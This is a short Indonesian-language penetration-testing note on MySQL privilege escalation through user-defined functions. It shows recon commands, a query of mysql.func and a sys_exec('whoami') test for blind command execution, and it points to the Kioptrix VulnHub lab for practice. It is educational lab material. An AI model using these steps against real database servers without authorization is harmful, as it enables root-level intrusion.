# Privilege Escalation Via UDF Functions MySQL
Pada MySQL, user bisa membuat custom functions. Hal ini dinamakan User Defined Function. Hal yang bisa jadi berbahaya adalah ketika UDF library dijalankan dengan akses root karena bisa menjadi celah priv esc

Syarat untuk bisa melakukan ini adalah dengan mendapatkan akses root mysql


## Recon
Jika kita menemukan mysql dijalankan dengan root. Maka ada kemungkinan kita bisa melakukan priv esc bilamana terdapat UDF Function. Cara ceknya 
```
ps -ef | grep mysql
```

Lalu cek library udf
```
$ locate udf
/usr/lib/lib_mysqludf_sys.so
```

Pastikan file library `lib_mysqludf_sys.so`  memiliki permission root, sebenarnya gak wajib ada library ini sih, kita lanjut aja ...

Jika mendapatkan username dan password mysql, coba cek `mysql.func`

```
mysql -u root -p
```


```
SELECT * FROM mysql.func
```

Misalnya ada function dengan nama `sys_exec` maka kita tes dengan cara 
```
select sys_exec
```
Jika hasilnya NULL seperti ini 
```
mysql> select sys_exec('whoami');
+--------------------+
| sys_exec('whoami') |
+--------------------+
| NULL               | 
+--------------------+
1 row in set (0.00 sec)

```
Maka sudah bisa dipastikan ada Blind RCE, namun jika error ada dua kemungkinan. 
1. Fuction membutuhkan parameter
2. Parameter yang dimasukkan salah

## Buat Exploit dari Awal
Jika UDF tersedia namun pada `mysql.func` gak ada, maka kita harus compile sendiri. Lebih jelasnya di https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf 

## Latihan
Kioptrix level 4 https://www.vulnhub.com/entry/kioptrix-level-13-4,25/